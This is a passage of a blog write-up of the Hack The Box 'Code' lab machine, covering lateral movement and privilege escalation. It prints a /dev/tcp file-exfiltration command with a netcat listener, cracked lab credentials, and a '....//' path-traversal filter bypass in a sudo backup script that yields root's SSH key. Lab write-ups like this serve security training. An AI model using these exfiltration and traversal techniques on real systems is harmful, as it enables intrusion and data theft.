6c9bc18baa9019db68f57821xxxxxxxx
</pre></td></tr></tbody></table></code></div></div>

<h2 id="lateral-movement"><span class="me-2">Lateral movement</span><a href="#lateral-movement" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<p>We list the content of the <strong>app</strong> directory, we find a directory called instance, containing an  <code class="language-plaintext highlighter-rouge">sqlite3</code> database file :</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre>app-production@code:~/app$ find . -type f
find . -type f
./app.py
./static/css/styles.css
./templates/index.html
./templates/codes.html
./templates/register.html
./templates/login.html
./templates/about.html
./__pycache__/app.cpython-38.pyc
./instance/database.db
app-production@code:~/app$
</pre></td></tr></tbody></table></code></div></div>
<p>We download this file to our machine, by :
1) Starting a listener on port 1337 and redirects the incoming data to a file on our machine :</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>nc <span class="nt">-l</span> <span class="nt">-p</span> 1337 <span class="o">&gt;</span> database.db
</pre></td></tr></tbody></table></code></div></div>

<p>1) Sending the contents of file directly to the listening netcat server over TCP from the box :</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nb">cat </span>database.db <span class="o">&gt;</span> /dev/tcp/10.10.16.22/1337
</pre></td></tr></tbody></table></code></div></div>

<p>We open this database file using <strong>sqlitebrowser</strong> :<br />
<a href="/assets/img/posts/code/tables.png" class="popup img-link shimmer"><img src="/assets/img/posts/code/tables.png" alt="Code " loading="lazy"></a>
<em>Database tables list</em><br />
We read the contain of the table user :</p>

<p><a href="/assets/img/posts/code/user.png" class="popup img-link shimmer"><img src="/assets/img/posts/code/user.png" alt="Code " loading="lazy"></a>
<em>User table</em></p>

<p>We have two credentials! The password is most likely an MD5 hash, as it‚Äôs represented as a 32-character hexadecimal string, equals to 128 bits.</p>

<p>We try to crack the hashes using CrackStation Online Hash Cracker : 
1) First hash cracked, plaintext password of <strong>development</strong> is : <strong>development</strong>
<a href="/assets/img/posts/code/crack1.png" class="popup img-link shimmer"><img src="/assets/img/posts/code/crack1.png" alt="Code " loading="lazy"></a>
<em>First hash Cracked</em></p>

<p>2) Second hash cracked, plaintext password of <strong>martin</strong> is : <strong>nafeelswordmaster</strong>
<a href="/assets/img/posts/code/crack2.png" class="popup img-link shimmer"><img src="/assets/img/posts/code/crack2.png" alt="Code " loading="lazy"></a>
<em>Second hash Cracked</em></p>

<p>So we try both credentials with ssh :<br />
1) Failed login to <strong>development</strong> :</p>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>‚ûú  Code ssh development@10.10.11.62
development@10.10.11.62's password:
Permission denied, please try again.
</pre></td></tr></tbody></table></code></div></div>
<p>2) Successful login to <strong>martin</strong> :</p>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
</pre></td><td class="rouge-code"><pre>‚ûú  Code ssh martin@10.10.11.62
martin@10.10.11.62's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue 05 Aug 2025 12:14:15 AM UTC

  System load:           0.06
  Usage of /:            52.5% of 5.33GB
  Memory usage:          14%
  Swap usage:            0%
  Processes:             235
  Users logged in:       2
  IPv4 address for eth0: 10.10.11.62
  IPv6 address for eth0: dead:beef::250:56ff:fe94:4acd


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Tue Aug 5 00:14:18 2025 from 10.10.16.22
martin@code:~$ whoami
martin
</pre></td></tr></tbody></table></code></div></div>

<p>So we succesfully logged in as <strong>martin</strong>! Now time for the privesc.</p>

<h2 id="privilege-escalation"><span class="me-2">Privilege escalation</span><a href="#privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<p>As we have <strong>martin</strong>‚Äôs password, first thing to check is to list the allowed sudo commands for the current user :</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>martin@code:~$ sudo -l
Matching Defaults entries for martin on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User martin may run the following commands on localhost:
    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
</pre></td></tr></tbody></table></code></div></div>

<p>So we can run /usr/bin/backy.sh as root, so a potential privesc attack vector.</p>

<p>We read the content of <strong>/usr/bin/backy.sh</strong> :</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
</pre></td><td class="rouge-code"><pre>martin@code:~<span class="nv">$ </span><span class="nb">cat</span> /usr/bin/backy.sh
<span class="c">#!/bin/bash</span>

<span class="k">if</span> <span class="o">[[</span> <span class="nv">$# </span><span class="nt">-ne</span> 1 <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
    /usr/bin/echo <span class="s2">"Usage: </span><span class="nv">$0</span><span class="s2"> &lt;task.json&gt;"</span>
    <span class="nb">exit </span>1
<span class="k">fi

</span><span class="nv">json_file</span><span class="o">=</span><span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span>

<span class="k">if</span> <span class="o">[[</span> <span class="o">!</span> <span class="nt">-f</span> <span class="s2">"</span><span class="nv">$json_file</span><span class="s2">"</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
    /usr/bin/echo <span class="s2">"Error: File '</span><span class="nv">$json_file</span><span class="s2">' not found."</span>
    <span class="nb">exit </span>1
<span class="k">fi

</span><span class="nv">allowed_paths</span><span class="o">=(</span><span class="s2">"/var/"</span> <span class="s2">"/home/"</span><span class="o">)</span>

<span class="nv">updated_json</span><span class="o">=</span><span class="si">$(</span>/usr/bin/jq <span class="s1">'.directories_to_archive |= map(gsub("\\.\\./"; ""))'</span> <span class="s2">"</span><span class="nv">$json_file</span><span class="s2">"</span><span class="si">)</span>

/usr/bin/echo <span class="s2">"</span><span class="nv">$updated_json</span><span class="s2">"</span> <span class="o">&gt;</span> <span class="s2">"</span><span class="nv">$json_file</span><span class="s2">"</span>

<span class="nv">directories_to_archive</span><span class="o">=</span><span class="si">$(</span>/usr/bin/echo <span class="s2">"</span><span class="nv">$updated_json</span><span class="s2">"</span> | /usr/bin/jq <span class="nt">-r</span> <span class="s1">'.directories_to_archive[]'</span><span class="si">)</span>

is_allowed_path<span class="o">()</span> <span class="o">{</span>
    <span class="nb">local </span><span class="nv">path</span><span class="o">=</span><span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span>
    <span class="k">for </span>allowed_path <span class="k">in</span> <span class="s2">"</span><span class="k">${</span><span class="nv">allowed_paths</span><span class="p">[@]</span><span class="k">}</span><span class="s2">"</span><span class="p">;</span> <span class="k">do
        if</span> <span class="o">[[</span> <span class="s2">"</span><span class="nv">$path</span><span class="s2">"</span> <span class="o">==</span> <span class="nv">$allowed_path</span><span class="k">*</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then
            return </span>0
        <span class="k">fi
    done
    return </span>1
<span class="o">}</span>

<span class="k">for </span><span class="nb">dir </span><span class="k">in</span> <span class="nv">$directories_to_archive</span><span class="p">;</span> <span class="k">do
    if</span> <span class="o">!</span> is_allowed_path <span class="s2">"</span><span class="nv">$dir</span><span class="s2">"</span><span class="p">;</span> <span class="k">then</span>
        /usr/bin/echo <span class="s2">"Error: </span><span class="nv">$dir</span><span class="s2"> is not allowed. Only directories under /var/ and /home/ are allowed."</span>
        <span class="nb">exit </span>1
    <span class="k">fi
done</span>

/usr/bin/backy <span class="s2">"</span><span class="nv">$json_file</span><span class="s2">"</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The script basically is for backing up directories, with the exception of subdirectories of /home and /var, any other root directory would be refused, and we find a regex, that finds and replace every <code class="language-plaintext highlighter-rouge">../</code> by ‚Äú ‚Äú (nothing), simply deleting it, in order to prevent path traversal.</p>

<p>So the scripts requires a json task file that contains the path to the directory to be backed up.</p>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>martin@code:~/backups$ sudo /usr/bin/backy.sh
Usage: /usr/bin/backy.sh &lt;task.json&gt;
</pre></td></tr></tbody></table></code></div></div>
<p>Here is an example of a task file found in the backup folder in the home directory :</p>
<div class="language-json highlighter-rouge"><div class="code-header">
        <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="w">
        </span><span class="nl">"destination"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/home/martin/backups/"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"multiprocessing"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
        </span><span class="nl">"verbose_log"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
        </span><span class="nl">"directories_to_archive"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
                </span><span class="s2">"/home/app-production/app"</span><span class="w">
        </span><span class="p">],</span><span class="w">

        </span><span class="nl">"exclude"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
                </span><span class="s2">".*"</span><span class="w">
        </span><span class="p">]</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>
<p>So all we have to do, is to modify this task file, to backup the /root directory.</p>

<p>In order to achieve this, we change the <code class="language-plaintext highlighter-rouge">directories_to_archive</code>, in a way to respect the constraint of the path beginning with <code class="language-plaintext highlighter-rouge">/home</code> or <code class="language-plaintext highlighter-rouge">/var</code>, and then bypass the path traversal sanitization filter.</p>

<p>Knowing that <code class="language-plaintext highlighter-rouge">../</code> is getting deleted, we replace them by <code class="language-plaintext highlighter-rouge">....//</code>, so that after the deletion of the the first <code class="language-plaintext highlighter-rouge">../</code>, we still left with a <code class="language-plaintext highlighter-rouge">../</code>, so we can change directory to root.</p>

<p>Our final task file will look like :</p>
<div class="language-json highlighter-rouge"><div class="code-header">
        <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="w">
        </span><span class="nl">"destination"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/home/martin/backups/"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"multiprocessing"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
        </span><span class="nl">"verbose_log"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
        </span><span class="nl">"directories_to_archive"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
                </span><span class="s2">"/var/....//root"</span><span class="w">
        </span><span class="p">]</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>
<p>We remove the exclusion line so that we backup hidden files and directories (like .ssh, which is the way for the root shell)</p>

<p>We set the <code class="language-plaintext highlighter-rouge">verbose_log</code> to <code class="language-plaintext highlighter-rouge">true</code> in order for backup messages output.</p>

<p>Now time to run it again :</p>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre></td><td class="rouge-code"><pre>martin@code:~/backups$ sudo /usr/bin/backy.sh task.json
2025/08/06 17:39:16 üçÄ backy 1.2
2025/08/06 17:39:16 üìã Working with task.json ...
2025/08/06 17:39:16 üí§ Nothing to sync
2025/08/06 17:39:16 üì§ Archiving: [/var/../root]
2025/08/06 17:39:16 üì• To: /home/martin/backups ...
2025/08/06 17:39:16 üì¶
tar: Removing leading `/var/../' from member names
/var/../root/
/var/../root/.local/
/var/../root/.local/share/
/var/../root/.local/share/nano/
/var/../root/.local/share/nano/search_history
/var/../root/.selected_editor
/var/../root/.sqlite_history
/var/../root/.profile
/var/../root/scripts/
/var/../root/scripts/cleanup.sh
/var/../root/scripts/backups/
/var/../root/scripts/backups/task.json
/var/../root/scripts/backups/code_home_app-production_app_2024_August.tar.bz2
/var/../root/scripts/database.db
/var/../root/scripts/cleanup2.sh
/var/../root/.python_history
/var/../root/root.txt
/var/../root/.cache/
/var/../root/.cache/motd.legal-displayed
/var/../root/.ssh/
/var/../root/.ssh/id_rsa
/var/../root/.ssh/authorized_keys
/var/../root/.bash_history
/var/../root/.bashrc
</pre></td></tr></tbody></table></code></div></div>
<p>It works out! Now we have the backup of the root directory successfully!
All is left is to exfiltrate it, unzip it, and login in as root.</p>

<p>Same technique as previously, we start a listener on our machine, and we send the file over TCP to our machine, upon unzip it, we can directly read the root flag root.txt, but we want persistence :)</p>

<p>So we run ssh using the private key of root :</p>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre></td><td class="rouge-code"><pre>‚ûú  .ssh ssh -i id_rsa root@10.10.11.62
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed 06 Aug 2025 06:06:23 PM UTC

  System load:           0.0
  Usage of /:            53.7% of 5.33GB
  Memory usage:          19%
  Swap usage:            0%
  Processes:             236
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.62
  IPv6 address for eth0: dead:beef::250:56ff:fe94:9e73


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Aug 6 18:06:25 2025 from 10.10.16.22
root@code:~#
</pre></td></tr></tbody></table></code></div></div>
<p>And we got root shell! Now we can read our root flag  :</p>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>root@code:~# cat root.txt
468aab655932260d0cff4dexxxxxxxx
</pre></td></tr></tbody></table></code></div></div>


  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
      <div class="post-meta mb-3">
        <i class="far fa-folder-open fa-fw me-1"></i>
        
          <a href="/categories/htb/">HTB</a>
      </div>
    

    <!-- tags -->
    
      <div class="post-tags">
        <i class="fa fa-tags fa-fw me-1"></i>
        
          <a
            href="/tags/linux/"
            class="post-tag no-text-decoration"
          >Linux</a>
        
          <a
            href="/tags/htb/"
            class="post-tag no-text-decoration"
          >HTB</a>
        
          <a
            href="/tags/python/"
            class="post-tag no-text-decoration"
          >Python</a>
        
          <a
            href="/tags/jail-break/"
            class="post-tag no-text-decoration"
          >Jail Break</a>
        
          <a
            href="/tags/sandbox-bypss/"
            class="post-tag no-text-decoration"
          >Sandbox Bypss</a>
        
          <a
            href="/tags/exfiltration/"
            class="post-tag no-text-decoration"
          >exfiltration</a>
        
          <a
            href="/tags/path-traversal/"
            class="post-tag no-text-decoration"
          >path traversal</a>
        
      </div>
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://twitter.com/intent/tweet?text=HTB%20Code%20-%20k1tch0p's%20Blog&url=http%3A%2F%2F0.0.0.0%3A4000%2Fposts%2FHTB_code%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
      </a>
    

      

      <a href="https://www.linkedin.com/feed/?shareActive=true&shareUrl=http%3A%2F%2F0.0.0.0%3A4000%2Fposts%2FHTB_code%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Linkedin" aria-label="Linkedin">
        <i class="fa-fw fab fa-linkedin"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted">
            <div class="access">
              <!-- Get 5 last posted/updated posts -->














  <section id="access-lastmod">
    <h2 class="panel-heading">Recently Updated</h2>
    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/HTB_code/">HTB Code</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/HTB_cypher/">HTB Cypher</a>
        </li>
      
    </ul>
  </section>
  <!-- #access-lastmod -->


              <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/htb/">HTB</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/linux/">Linux</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/bbot/">bbot</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/cypher-injection/">cypher injection</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/exfiltration/">exfiltration</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/jail-break/">Jail Break</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/neo4j/">Neo4j</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/path-traversal/">path traversal</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/python/">Python</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/sandbox-bypss/">Sandbox Bypss</a>
      
    </div>
  </section>


            </div>

            
              
              






  <div class="toc-border-cover z-3"></div>
  <section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4">
    <h2 class="panel-heading ps-3 pb-2 mb-0">Contents</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->















  

  

  

  

  

  

  

  
    










  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">Further Reading</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
          <a href="/posts/HTB_cypher/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1753920000"
  data-df="ll"
  
>
  Jul 31, 2025
</time>

              <h4 class="pt-0 my-2">HTB Cypher</h4>
              <div class="text-muted">
                <p>OS: üêß Linux Difficulty: Medium Points: 40 Author: Techromancer   Cypher is focused on a cypher injection flaw granting a shell as neo4j. A history file leaks credentials for graphasm, who can run b...</p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/HTB_cypher/"
      class="btn btn-outline-primary"
      aria-label="Older"
    >
      <p>HTB Cypher</p>
    </a>
  

  
    <div class="btn btn-outline-primary disabled" aria-label="Newer">
      <p>-</p>
    </div>
  
</nav>

            

            <!-- The Footer -->

<footer
  aria-label="Site Info"
  class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  "
>
  <p>¬©
    <time>2025</time>

    
      <a href="https://www.linkedin.com/in/nassim-nedjar-78ab83207/">k1tch0p</a>.
    

    
      <span
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."
      >Some rights reserved.</span>
    
  </p>

  <p>Using the <a
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="v7.3.1"
        href="https://github.com/cotes2020/jekyll-theme-chirpy"
        target="_blank"
        rel="noopener"
      >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.
  </p>
</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center d-none">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/htb/">HTB</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/linux/">Linux</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/bbot/">bbot</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/cypher-injection/">cypher injection</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/exfiltration/">exfiltration</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/jail-break/">Jail Break</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/neo4j/">Neo4j</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/path-traversal/">path traversal</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/python/">Python</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/sandbox-bypss/">Sandbox Bypss</a>
      
    </div>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
